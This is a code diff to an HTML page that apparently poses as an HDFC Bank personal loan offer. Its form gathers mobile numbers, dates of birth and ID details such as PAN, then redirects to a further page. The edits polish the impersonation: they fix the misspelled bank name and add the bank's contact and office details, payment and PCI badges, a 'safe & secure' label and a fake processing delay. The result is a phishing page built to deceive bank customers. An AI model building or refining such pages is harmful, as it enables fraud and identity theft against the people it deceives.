@@ -5,54 +5,79 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HDFC BANK - Personal Loan Offer</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; background-color: #f4f7f9; }
-        .header { background: #003366; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        :root {
+            --hdfc-blue: #004c8f;
+            --hdfc-dark: #003366;
+            --hdfc-red: #ed1c24;
+        }
+        body { font-family: Arial, sans-serif; margin: 0; background-color: #f4f7f9; color: #333; }
+        
+        /* Header */
+        .header { background: var(--hdfc-dark); color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
         .logo { font-weight: bold; font-size: 20px; border: 2px solid white; padding: 2px 8px; }
         .safe-tag { background: #28a745; color: white; padding: 5px 10px; border-radius: 20px; font-size: 12px; }
         
-        .banner { background: #e3f2fd; padding: 20px; text-align: center; }
-        .banner h2 { color: #d32f2f; margin: 5px 0; }
+        /* Banner */
+        .banner { background: #e3f2fd; padding: 20px; text-align: center; border-bottom: 1px solid #d1e9ff; }
+        .banner h2 { color: var(--hdfc-red); margin: 5px 0; font-size: 22px; }
         
-        .form-container { padding: 20px; background: white; margin-top: 10px; }
+        /* Form Container */
+        .form-container { padding: 20px; background: white; margin-top: 10px; max-width: 500px; margin-left: auto; margin-right: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
         .input-group { margin-bottom: 20px; position: relative; }
-        label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; }
+        label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; font-weight: 600; }
         
         input[type="text"], input[type="date"] {
-            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; outline: none;
+            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; outline: none; font-size: 16px;
         }
+        input:focus { border-color: var(--hdfc-blue); }
 
         /* Error Style */
-        .error-border { border: 2px solid red !important; }
-        .error-text { color: red; font-size: 11px; margin-top: 5px; display: none; }
+        .error-border { border: 2px solid var(--hdfc-red) !important; }
+        .error-text { color: var(--hdfc-red); font-size: 11px; margin-top: 5px; display: none; }
         
         .radio-group { display: flex; gap: 15px; margin-bottom: 15px; }
-        .info-box { background: #fff9c4; border: 1px solid #fbc02d; padding: 10px; font-size: 13px; border-radius: 5px; margin-bottom: 20px; }
+        .info-box { background: #fff9c4; border: 1px solid #fbc02d; padding: 12px; font-size: 13px; border-radius: 5px; margin-bottom: 20px; color: #665c00; }
         
-        /* Button States */
+        /* Submit Button */
         .btn-submit {
-            background: #cbd2f1; color: white; border: none; width: 100%; padding: 15px;
+            background: #cbd2f1; color: white; border: none; width: 100%; padding: 16px;
             font-size: 16px; border-radius: 5px; cursor: not-allowed; font-weight: bold; transition: 0.3s;
+            display: flex; justify-content: center; align-items: center;
         }
-        .btn-active { background: #1a73e8 !important; cursor: pointer !important; }
+        .btn-active { background: #1a73e8 !important; cursor: pointer !important; box-shadow: 0 4px 12px rgba(26,115,232,0.3); }
 
-        .footer { text-align: center; padding: 20px; font-size: 12px; color: #777; }
+        /* Loader */
+        .loader {
+            display: none; border: 3px solid #f3f3f3; border-top: 3px solid white;
+            border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Footer Style */
+        footer { background-color: #f9f9f9; padding: 30px 20px; border-top: 1px solid #ddd; margin-top: 40px; }
+        .footer-content { max-width: 1200px; margin: 0 auto; display: flex; flex-wrap: wrap; justify-content: space-between; gap: 30px; }
+        .footer-sec h4 { color: var(--hdfc-dark); margin-bottom: 15px; border-bottom: 2px solid var(--hdfc-blue); display: inline-block; font-size: 15px; }
+        .footer-sec p, .footer-sec li { font-size: 13px; color: #555; line-height: 1.8; list-style: none; padding: 0; }
+        .footer-sec a { text-decoration: none; color: #555; }
+        .footer-bottom { text-align: center; border-top: 1px solid #eee; margin-top: 25px; padding-top: 20px; font-size: 12px; color: #888; }
+
         #pan-input-section { display: none; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div class="logo">HBFC BANK</div>
+    <div class="logo">HDFC BANK</div>
     <div class="safe-tag">100% SAFE & SECURE</div>
 </div>
 
 <div class="banner">
-    <p>Hey there!</p>
+    <p style="margin:0; font-size:14px; color:#555;">Hey there!</p>
     <h2>Your Personal Loan Offer is waiting inside.</h2>
 </div>
 
 <div class="form-container">
-    <h3>Welcome! Check your Personal Loan offer</h3>
+    <h3 style="margin-top:0; font-size:18px;">Welcome! Check your Personal Loan offer</h3>
     
     <div class="input-group">
         <label>Enter Registered Mobile Number</label>
@@ -91,16 +116,52 @@
         <label><input type="radio" name="pep" checked> No</label>
     </div>
 
-    <div style="font-size: 12px; color: #555; margin-bottom: 20px;">
-        <input type="checkbox" id="consent-check" onclick="toggleButton()"> I hereby consent to processing of my data...
+    <div style="font-size: 12px; color: #555; margin-bottom: 25px; display: flex; gap: 8px; align-items: flex-start;">
+        <input type="checkbox" id="consent-check" onclick="toggleButton()" style="margin-top:3px;"> 
+        <span>I hereby consent to processing of my data in accordance with the Bank's Privacy Policy.</span>
     </div>
 
-    <button id="submit-btn" class="btn-submit" onclick="validateAndSubmit()">View Loan Eligibility</button>
+    <button id="submit-btn" class="btn-submit" onclick="validateAndSubmit()">
+        <span id="btn-text">View Loan Eligibility</span>
+        <div id="btn-loader" class="loader"></div>
+    </button>
 </div>
 
-<div class="footer">
-    © Copyright HBFC Bank Ltd.
-</div>
+<footer>
+    <div class="footer-content">
+        <div class="footer-sec">
+            <h4>Important Links</h4>
+            <li><a href="#">Privacy Policy</a></li>
+            <li><a href="#">Terms and Conditions</a></li>
+            <li><a href="#">Security Tips</a></li>
+            <li><a href="#">Grievance Redressal</a></li>
+        </div>
+        <div class="footer-sec">
+            <h4>Contact Us</h4>
+            <p>
+                <b>Helpline:</b> 1800 202 6161<br>
+                <b>Email:</b> support@hdfcbank.com<br>
+                <b>Corporate ID:</b> L65920MH1994PLC080618
+            </p>
+        </div>
+        <div class="footer-sec">
+            <h4>Registered Office</h4>
+            <p>
+                HDFC Bank House, Senapati Bapat Marg,<br>
+                Lower Parel (West), Mumbai - 400 013,<br>
+                Maharashtra, India.
+            </p>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p>© Copyright HDFC Bank Ltd. 2026. All rights reserved.</p>
+        <div style="margin-top: 10px; opacity: 0.6;">
+            <img src="https://img.icons8.com/color/24/000000/visa.png">
+            <img src="https://img.icons8.com/color/24/000000/mastercard.png">
+            <img src="https://img.icons8.com/color/24/000000/pci-compliant.png">
+        </div>
+    </div>
+</footer>
 
 <script>
     function toggleInput(type) {
@@ -132,17 +193,22 @@
         const dobError = document.getElementById('dob-error');
         const isPanSelected = document.querySelector('input[name="id_type"]:checked').value === 'pan';
         const checkBox = document.getElementById("consent-check");
+        
+        const btnText = document.getElementById('btn-text');
+        const btnLoader = document.getElementById('btn-loader');
+        const submitBtn = document.getElementById('submit-btn');
 
         let isValid = true;
+
+        // Reset
+        mobile.classList.remove('error-border');
+        mobileError.style.display = 'none';
 
         // Mobile Validation
         if (mobile.value.length < 10 || isNaN(mobile.value)) {
             mobile.classList.add('error-border');
             mobileError.style.display = 'block';
             isValid = false;
-        } else {
-            mobile.classList.remove('error-border');
-            mobileError.style.display = 'none';
         }
 
         // DOB Age Validation (18+)
@@ -155,10 +221,7 @@
                 const today = new Date();
                 let age = today.getFullYear() - birthDate.getFullYear();
                 const m = today.getMonth() - birthDate.getMonth();
-                if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
-                    age--;
-                }
-
+                if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) { age--; }
                 if (age < 18) {
                     dob.classList.add('error-border');
                     dobError.style.display = 'block';
@@ -184,8 +247,16 @@
         }
 
         if (isValid && checkBox.checked) {
-            // Success: enter1.html par bhejein
-            window.location.href = "enter1.html";
+            // Processing
+            btnText.style.display = 'none';
+            btnLoader.style.display = 'block';
+            submitBtn.disabled = true;
+
+            // 2 seconds delay
+            setTimeout(function() {
+                window.location.href = "enter1.html";
+            }, 2000);
+
         } else if (!checkBox.checked) {
             alert("Please accept the consent checkbox");
         }
